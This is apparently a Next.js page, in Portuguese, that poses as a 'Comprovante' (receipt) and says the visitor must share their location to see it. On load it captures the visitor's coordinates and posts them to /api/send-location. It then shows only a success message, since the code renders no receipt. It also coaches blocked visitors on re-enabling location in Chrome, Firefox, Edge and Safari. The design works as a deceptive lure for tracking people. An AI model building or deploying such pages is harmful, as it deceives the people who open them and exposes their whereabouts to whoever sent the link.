"use client";

import { useEffect, useState } from "react";

export default function Home() {
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  const [loading, setLoading] = useState<boolean>(false);
  const [isPermissionBlocked, setIsPermissionBlocked] = useState<boolean>(false);
  const [successMessage, setSuccessMessage] = useState<string | null>(null);

  const requestLocationPermission = () => {
    if (!navigator.geolocation) {
      setErrorMessage("Seu navegador não suporta geolocalização.");
      return;
    }

    setLoading(true);
    setErrorMessage(null);
    setSuccessMessage(null); // Resetando mensagem de sucesso ao tentar novamente

    navigator.permissions
      ?.query({ name: "geolocation" })
      .then((permissionStatus) => {
        if (permissionStatus.state === "denied") {
          setIsPermissionBlocked(true);
          setErrorMessage("A permissão de localização está bloqueada. Ative manualmente.");
          setLoading(false);
          return;
        }

        navigator.geolocation.getCurrentPosition(
          async (position) => {
            const { latitude, longitude } = position.coords;

            try {
              console.log("Enviando requisição para /api/send-location...");
              const response = await fetch("/api/send-location", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ latitude, longitude }),
              });

              console.log("Resposta recebida:", response);
              if (!response.ok) {
                throw new Error(`Erro no servidor: ${response.status}`);
              }

              const data = await response.json();
              console.log("🚀 ~ data:", data);

              if (data.success) {
                setSuccessMessage("✅ Localização enviada com sucesso!");
              } else {
                setErrorMessage("Erro ao enviar localização.");
              }
            } catch (error) {
              console.error("Erro ao enviar localização:", error);
              setErrorMessage("Erro ao se comunicar com o servidor.");
            } finally {
              setLoading(false);
            }
          },
          (error) => {
            setLoading(false);
            switch (error.code) {
              case error.PERMISSION_DENIED:
                setErrorMessage("Você negou o acesso à localização.");
                break;
              case error.POSITION_UNAVAILABLE:
                setErrorMessage("A localização não está disponível.");
                break;
              case error.TIMEOUT:
                setErrorMessage("O tempo para obter a localização expirou.");
                break;
              default:
                setErrorMessage("Erro desconhecido ao obter localização.");
            }
          }
        );
      });
  };

  useEffect(() => {
    requestLocationPermission();
  }, []);

  return (
    <div className="flex min-h-screen items-center justify-center bg-gray-100 p-6">
      <div className="w-full max-w-lg bg-white shadow-lg rounded-lg p-6 text-center">
        <h1 className="text-2xl font-bold text-gray-800">📍 Comprovante</h1>
        <p className="text-gray-600 mt-2">
          Para visualizar o comprovante, permita o acesso à sua localização.
        </p>

        {loading && (
          <div className="mt-4 text-blue-500 font-semibold">
            🔄 Capturando localização...
          </div>
        )}

        {successMessage && (
          <div className="mt-4 text-green-600 font-semibold">{successMessage}</div>
        )}

        {errorMessage && (
          <div className="mt-4 text-red-600">
            <p>{errorMessage}</p>

            {isPermissionBlocked ? (
              <div className="mt-4">
                <p className="text-gray-700 font-semibold">
                  ⚠️ Sua permissão de localização está bloqueada. Siga as instruções abaixo para desbloquear:
                </p>

                <ul className="text-gray-600 text-left mt-3 space-y-2 gap-4 flex flex-col">
                  <li className="flex flex-col gap-2">
                    <strong> ✅ Google Chrome (Desktop e Android):</strong>
                    Copie e cole na barra de endereços e pressione Enter:
                    <span className="font-mono bg-gray-200 p-1 rounded">
                      chrome://settings/content/location
                    </span>
                  </li>

                  <li className="flex flex-col gap-2">
                    <strong>🦊 Mozilla Firefox:</strong>
                    Copie e cole na barra de endereços e pressione Enter:
                    <span className="font-mono bg-gray-200 p-1 rounded">
                      about:preferences#privacy
                    </span>
                  </li>

                  <li className="flex flex-col gap-2">
                    <strong>🔵 Microsoft Edge:</strong>
                    Copie e cole na barra de endereços e pressione Enter:
                    <span className="font-mono bg-gray-200 p-1 rounded">
                      edge://settings/content/location
                    </span>
                  </li>

                  <li>
                    <strong>🍏 Safari (iPhone, iPad e Mac):</strong> <br />
                    Vá para <strong>Ajustes</strong> → <strong>Safari</strong> →{" "}
                    <strong>Localização</strong> e selecione{" "}
                    <strong>Permitir</strong>.
                  </li>
                </ul>
              </div>
            ) : (
              <button
                onClick={requestLocationPermission}
                className="mt-3 bg-blue-500 text-white px-4 py-2 rounded-lg hover:bg-blue-600 transition"
              >
                Permitir Localização
              </button>
            )}
          </div>
        )}

        {!loading && !errorMessage && !successMessage && (
          <p className="mt-4 text-gray-500">Aguardando permissão...</p>
        )}
      </div>
    </div>
  );
}
